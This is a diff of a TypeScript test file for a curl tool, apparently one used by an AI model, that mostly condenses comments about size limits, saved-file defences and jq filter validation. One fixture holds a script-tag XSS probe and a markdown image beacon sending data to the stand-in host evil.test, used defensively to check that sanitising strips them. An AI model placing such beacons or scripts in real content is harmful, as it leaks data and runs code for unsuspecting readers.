@@ -1,13 +1,12 @@
 // src/lib/tools/curl-execute.size-and-save.test.ts
 // End-to-end guards for the size ceiling and the saved artefact's reported facts.
 //
-// **These belong at `executeCurlRequest`, not beside the parser or the
-// processor.** Every individual link is defensible on its own: the parser
-// returns what it was told to return, the gate measures what it was handed, the
-// file saver writes what it was given. The defects this file guards existed only
-// in the COMPOSITION — a count taken on one representation and applied to
-// another, and a predicate spelled two ways in one function. A test beside any
-// one of those feeds it the input its author imagined and passes either way.
+// **At `executeCurlRequest`, not beside the parser or the processor**, because
+// what these cases assert is a property of the composition rather than of any
+// one link. Each link in isolation does what it was told: the parser returns a
+// buffer, the gate measures what it is handed, the saver writes what it is
+// given. A unit test beside one of them feeds it the input its author imagined,
+// so it cannot see a count taken on one representation and applied to another.
 // `LESSONS.md` RC-33.
 
 import { describe, it, expect, vi, beforeEach, afterAll, type Mock } from "vitest";
@@ -115,18 +114,9 @@ describe("curl_execute size ceiling — both representations are checked", () =>
     });
 
     it("refuses a body under the wire cap whose DECODE exceeds it", async () => {
-        // **The regression guard, and it asserts the opposite of what this file
-        // asserted for one commit.** Moving the ceiling onto wire octets alone
-        // made the message honest and stopped bounding the work: U+FFFD is three
-        // bytes where an invalid octet was one, so the string every stage below
-        // the gate allocates is up to 3x the number that was checked, and the
-        // multiplier is the origin's to choose.
-        //
-        // Measured on an ordinary 9.5 MB gzip — not an attack — 1.81x inflation
-        // took one request from refused to accepted at 3.9x the CPU and 10.3x
-        // the peak RSS, past `MAX_TOTAL_RESPONSE_MEMORY`, which is documented as
-        // the ceiling across ALL concurrent requests. So both counts are checked
-        // and the message carries both.
+        // The ceiling has to hold on the decode, because that is what every
+        // stage below the gate allocates and the inflation multiplier belongs to
+        // the origin. `ARCHITECTURE.md` invariant 14 carries the measurement.
         const cap = LIMITS.MAX_RESPONSE_SIZE;
         const body = Buffer.alloc(cap - 64, 0xe9);
         // Fixture guard: the premise is that the wire fits and the decode does
@@ -169,17 +159,15 @@ describe("curl_execute size ceiling — both representations are checked", () =>
 describe("curl_execute saved artefact — defended, and honestly measured", () => {
     it("applies the strip stages to what lands on disk", async () => {
         // **The artefact must be safe on every route the server advertises.**
-        // `savedMessage` tells the model to read a non-JSON file "with your own
-        // tooling" — outside this process and outside every defence — and
-        // `jq_query` cannot open a non-JSON file at all, so there is no defended
-        // reader to fall back on. An attempt to persist the origin's raw octets
-        // was reverted in review for exactly this; `docs/todos/018` sequences
-        // the fidelity question behind the JSON-only decision.
+        // `savedMessage` sends a non-JSON file to the model's own tooling,
+        // outside every defence pass, because `jq_query` cannot open one — so
+        // there is no defended reader to fall back on and the bytes on disk have
+        // to be safe as they are.
         //
         // `text/markdown` because it selects both stage sets: HTML runs the
         // markup strip but not the markdown beacon stages, so a beacon would
-        // survive a defence pass and this case would fail for a reason that has
-        // nothing to do with persistence.
+        // survive and this case would fail for a reason unrelated to its
+        // subject.
         const body = Buffer.from(
             "# ok\n\n<script>alert(1)</script> and ![x](https://evil.test/?d=1)",
             "utf8"
@@ -243,18 +231,12 @@ describe("curl_execute saved artefact — 'did a filter run' has one answer", ()
     });
 
     it("rejects an empty jq_filter at the schema rather than half-applying it", async () => {
-        // The mirror side, and the defect it guards was measured. `""` used to
-        // pass validation, skip the filter step because `if (options.jqFilter)`
-        // is falsy, and still be counted as filtered by two decisions testing
-        // `!== undefined` — so the artefact became the re-encoded defended text
-        // and the message called it "FILTER OUTPUT", three false statements
-        // about a file holding the whole unfiltered body.
-        //
-        // Fixed twice over: one `filterApplied` boolean set where the filter
-        // actually runs, and `.min(1)` here so the disagreeing value is not
-        // constructible. This asserts the boundary half; the predicate half has
-        // no reachable input left to test through, which is the point of fixing
-        // it at both layers.
+        // The boundary half of a two-layer guard. `.min(1)` refuses the value
+        // here; `processResponse`'s `filterApplied` is what makes it harmless if
+        // it ever arrives anyway, which it can — a library caller reaches that
+        // function without passing through this schema. There is no reachable
+        // input left to test the second layer through, and that is the point of
+        // having it.
         expect(() => params({ url: "https://example.test/x", jq_filter: "" })).toThrow();
     });
 });
